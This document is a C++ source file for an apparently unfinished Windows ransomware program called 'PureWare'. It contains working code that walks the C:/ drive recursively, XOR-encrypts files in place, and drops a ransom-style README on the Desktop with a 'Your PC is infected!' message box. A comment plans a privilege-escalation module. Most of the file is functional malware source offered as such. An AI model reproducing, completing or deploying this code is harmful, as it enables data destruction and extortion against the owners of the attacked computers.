#include "PureWare.hpp"

using path_t = std::filesystem::path;
using namespace std;
auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");

void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript);
void encryptFile(const std::filesystem::path& path, const std::string& key);
void decryptFile(const path_t& filePath, const std::string& key);

int main(int argc, char* argv[])
{
    setlocale(LC_ALL, "Russian");

    FileModule FileClass;
    FileClass.FindDirectory();


    path_t pathFolder = "C:/";
    vector<path_t> PathToCript;

    file_logger->set_level(spdlog::level::info);
    file_logger->info("start the Cript");

    path_t startPath = "C:/";
    std::vector<path_t> pathToCript;
    //traverseDirectory(startPath, pathToCript);
    /*try {
        if (filesystem::exists(pathFolder) && filesystem::is_directory(pathFolder)) {
            for (const auto& entry : filesystem::directory_iterator(pathFolder)) {
                auto filePath = entry.path();
                if (entry.is_directory()) {
                    // Ignore certain directories
                    if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") continue;

                    // Check if directory is empty
                    if (filesystem::is_empty(filePath)) {
                        std::cout << "Directory is empty" << std::endl;
                    }
                    else {
                        PathToCript.emplace_back(filePath);
                        std::cout << "Directory is not empty" << std::endl;
                    }
                }
                else if (entry.is_regular_file()) {
                    // If it's a file, add it to the vector
                    PathToCript.emplace_back(filePath);
                    std::cout << "File added: " << filePath << std::endl;
                }
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        file_logger->error("Eror is {}", e.what());
        file_logger->error(GetLastError());
    }
    catch (const std::exception& e) {
        std::cerr << "Standard exception: " << e.what() << std::endl;
        file_logger->error("Eror is {}", e.what());
        file_logger->error(GetLastError());
    }
    catch (...) {
        file_logger->error("Unknown error occurred");
        std::cerr << "Unknown error occurred" << std::endl;
        file_logger->error(GetLastError());
    }*/

    path_t a = "C:/Users/zero/Desktop/1.txt";
    encryptFile(a, "12");
    file_logger->info("ok");
    //decryptFile(a, "12");
    /*string key{ 12 };
    for (const auto& a : pathToCript) {
        file_logger->info("path {}", a.string());
        if (std::filesystem::is_regular_file(a)) {
            encryptFile(a, key);
        }
    }*/

    NoteModule warn_user;
    warn_user.MakeSomeShit();

    return 0;
}

void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
    try {
        if (filesystem::exists(path) && filesystem::is_directory(path)) {
            bool isEmpty = true;
            for (const auto& entry : filesystem::directory_iterator(path)) {
                auto filePath = entry.path();
                // Skip specific directories
                if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") {
                    continue;
                }

                if (entry.is_directory()) {
                    // Recursive call to traverse subdirectories
                    traverseDirectory(filePath, pathToCript);
                    isEmpty = false;
                }
                else if (entry.is_regular_file()) {
                    // Add file to the vector
                    pathToCript.emplace_back(filePath);
                    isEmpty = false;
                }
            }

            if (!isEmpty) {
                // Add non-empty directory to the vector
                pathToCript.emplace_back(path);
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        file_logger->error("Filesystem error : {}", e.what());
    }
    catch (const std::exception& e) {
        file_logger->error("Standard exception:  {}", e.what());
    }
    catch (...) {
        file_logger->error("Unknown error occurred last:  {}", GetLastError());
    }
}

void encryptFile(const std::filesystem::path& path, const std::string& key) {
    // Проверка существования файла и доступности для чтения
    if (!std::filesystem::exists(path) || !std::filesystem::is_regular_file(path)) {
        file_logger->critical("Файл не найден или это не файл: {}", path.string());
        return;
    }

    // Открытие файла для чтения в бинарном режиме
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) {
        file_logger->critical("Не удалось открыть файл для чтения: {}", path.string());
        return;
    }

    // Чтение содержимого файла
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // XOR шифрование
    for (size_t i = 0; i < buffer.size(); ++i) {
        buffer[i] ^= key[i % key.length()];
    }

    // Запись зашифрованных данных обратно в файл
    std::ofstream outfile(path, std::ios::binary);
    if (!outfile.is_open()) {
        file_logger->critical("Не удалось открыть файл для записи : {}", path.string());
        return;
    }

    outfile.write(buffer.data(), buffer.size());
    outfile.close();
}

void decryptFile(const path_t& filePath, const std::string& key) {
    // Open the file for reading in binary mode
    std::ifstream fileIn(filePath, std::ios::binary);
    if (!fileIn) {
        file_logger->critical("Cannot open file: {}", filePath.string());
        return;
    }
    // Read the file content
    std::string fileContent((std::istreambuf_iterator<char>(fileIn)), std::istreambuf_iterator<char>());
    fileIn.close();

    // Perform XOR decryption (same as encryption)
    for (size_t i = 0; i < fileContent.size(); ++i) {
        fileContent[i] ^= key[i % key.size()];
    }

    // Write the decrypted content back to the file
    std::ofstream fileOut(filePath, std::ios::binary);
    if (!fileOut) {
        file_logger->critical("Cannot open file: {}", filePath.string());
        return;
    }

    fileOut.write(fileContent.data(), fileContent.size());
    fileOut.close();
}

// Public method that writes user's home directory to the private class variable "directory"
void FileModule::FindDirectory() {

    std::string homeDir;
    PWSTR directoryPath = nullptr;

    // Here we should run the PrivEsc class module and if it returns true, then start working from the 'C:\' i.e.
    // and if it returns false, just take the user's home directory

    // works from Windows Vista and later, alternative for elders's - SHGetFolderPath
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &directoryPath))) {
        directoryPath_ = directoryPath;
    }

    CoTaskMemFree(directoryPath); // need to free because SHGetKnownFolderPath allocates address and stores path in it

}


// NoteModule implementation starts here

NoteModule::NoteModule() : Note_that_would_be_set_in_file(L"Your PC's files were encrypted.\n") {
}

NoteModule::NoteModule(std::wstring Note_that_would_be_set_in_file) : Note_that_would_be_set_in_file(Note_that_would_be_set_in_file) {
}

void NoteModule::MakeSomeShit() {
    // Getting username
    wchar_t username[257];
    DWORD username_len = 257;
    GetUserNameW(username, &username_len); // Возможно слоамается, если запустить от администратора.

    // Creating README file at parsed above user's Desktop.
    std::filesystem::path README_file_path = L"C:\\Users\\" + std::wstring(username) + L"\\Desktop\\README.txt";
    Create_README_file(README_file_path);


    // Message Box that notifies user about encrypting files and asks to read README
    int msgboxID = MessageBox(
        NULL,
        "Your PC is infected!\nCheck README.txt file on your desktop.\nPush \"Yes\" button to open file right now.",
        "CHECK README!",
        MB_ICONEXCLAMATION | MB_YESNO
    );

    // If msbox's "Yes" button was pushed - open README.
    if (msgboxID == IDYES) {
        wchar_t string_to_open_README[1024] = L"start ";
        wcscat(string_to_open_README, README_file_path.c_str());

        SetConsoleOutputCP(1251);
        SetConsoleCP(1251);
        _wsystem(string_to_open_README);
    }
}

// Method that creates README file at Desktop
void NoteModule::Create_README_file(std::filesystem::path README_path) {
    std::wofstream out;
    out.open(README_path);
    if (out.is_open())
    {
        out << Note_that_would_be_set_in_file << std::endl;
    }
    out.close();

}

// NoteModule implementation ends here